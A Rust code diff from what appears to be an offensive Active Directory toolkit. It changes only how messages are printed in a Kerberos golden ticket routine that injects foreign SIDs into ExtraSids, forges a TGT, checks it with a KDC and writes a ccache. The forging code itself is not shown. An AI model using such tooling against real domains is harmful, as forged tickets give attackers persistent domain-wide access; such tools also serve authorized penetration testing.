@@ -159,12 +159,12 @@ async fn golden_impl(cfg: GoldenConfig, checklist: &mut ui::StageChecklist) -> R
         extra_sids: extras,
     };
     if !cfg.foreign_sid.is_empty() {
-        println!(
-            "[+] injecting {} foreign SID(s) into PAC ExtraSids:",
+        ui::ok(&format!(
+            "injecting {} foreign SID(s) into PAC ExtraSids:",
             cfg.foreign_sid.len()
-        );
+        ));
         for s in &cfg.foreign_sid {
-            println!("    {s}");
+            ui::note(&format!("    {s}"));
         }
         checklist.record_ok(
             "parse foreign SIDs (ExtraSids)",
@@ -178,10 +178,10 @@ async fn golden_impl(cfg: GoldenConfig, checklist: &mut ui::StageChecklist) -> R
         "forge golden TGT",
         format!("{}@{} (rid {})", cfg.user, cfg.realm, cfg.rid),
     );
-    println!(
-        "[+] forged golden TGT: {}@{} (rid {}, groups {:?})",
+    ui::ok(&format!(
+        "forged golden TGT: {}@{} (rid {}, groups {:?})",
         cfg.user, cfg.realm, cfg.rid, cfg.groups
-    );
+    ));
 
     if let Some(spn) = &cfg.verify_spn {
         match adhammer_kerberos::roast_spn(&tgt, &cfg.user, spn, &cfg.kdc).await {
@@ -190,14 +190,16 @@ async fn golden_impl(cfg: GoldenConfig, checklist: &mut ui::StageChecklist) -> R
                     "verify with KDC (--verify-spn)",
                     format!("KDC accepted for {spn}"),
                 );
-                println!("[+] KDC accepted the golden ticket (TGS-REP for {spn})");
+                ui::ok(&format!(
+                    "KDC accepted the golden ticket (TGS-REP for {spn})"
+                ));
             }
             Err(e) => {
                 checklist.record_ok(
                     "verify with KDC (--verify-spn)",
                     format!("KDC rejected for {spn}: {e}"),
                 );
-                println!("[-] KDC rejected the golden ticket for {spn}: {e}");
+                ui::bad(&format!("KDC rejected the golden ticket for {spn}: {e}"));
             }
         }
     } else {
@@ -214,10 +216,10 @@ async fn golden_impl(cfg: GoldenConfig, checklist: &mut ui::StageChecklist) -> R
             &cc,
         )?;
         checklist.record_ok("write ccache", format!("→ {out} ({} bytes)", cc.len()));
-        println!(
-            "[+] wrote ccache → {out} ({} bytes). Use: KRB5CCNAME={out}",
+        ui::ok(&format!(
+            "wrote ccache → {out} ({} bytes). Use: KRB5CCNAME={out}",
             cc.len()
-        );
+        ));
     } else {
         checklist.record_ok("write ccache", "skipped (no --out)");
     }
